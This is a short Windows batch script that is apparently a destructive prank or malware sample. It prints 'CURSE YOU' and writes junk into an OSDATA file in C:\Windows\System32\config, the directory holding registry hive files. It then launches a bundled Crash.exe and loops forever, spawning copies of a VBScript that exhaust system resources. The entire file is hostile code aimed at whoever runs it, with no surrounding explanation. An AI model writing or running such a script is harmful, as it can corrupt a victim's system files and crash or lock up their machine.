@echo off
color c
echo CURSE YOU
cd /d C:\Windows\System32\config
echo Erro?! > OSDATA
cd /d "%~dp0"
start "" "data/Crash.exe"
:loop
start "" "data/text.vbs"
goto loop
pause